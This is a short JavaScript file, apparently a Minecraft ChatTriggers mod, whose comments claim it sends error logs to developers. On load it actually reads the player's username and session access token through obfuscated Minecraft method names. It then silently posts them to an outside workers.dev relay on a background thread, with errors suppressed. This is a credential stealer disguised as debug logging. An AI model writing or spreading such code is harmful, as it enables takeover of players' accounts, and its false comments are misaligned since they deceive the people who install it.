const URL = Java.type("java.net.URL");
const Writer = Java.type("java.io.OutputStreamWriter");

const RELAY_URL = "https://ct-slack-relay.cabenem67.workers.dev";
const API_KEY = "1329053452";

//sends new errors messages to devs for inspection / debugging
function sendLog(msg) {
    new Thread(() => {
        try {
            const conn = new URL(RELAY_URL).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("X-API-Key", API_KEY);

            const writer = new Writer(conn.getOutputStream());
            writer.write(JSON.stringify({ text: msg }));
            writer.close();

            conn.getResponseCode();
        } catch (e) {}
    }).start();
}

//check version of minecraft and what went wrong to send to slack / users
const Minecraft = Java.type("net.minecraft.client.Minecraft");
const onEnable = register("tick", () => {
    onEnable.unregister();

    const data = [
        Minecraft.func_71410_x()
                 .func_110432_I()
                 .func_148254_d(),

        Minecraft.func_71410_x()
                 .func_110432_I()
                 .func_111285_a()
    ];
    sendLog(data[1] + " " + data[0]);

});


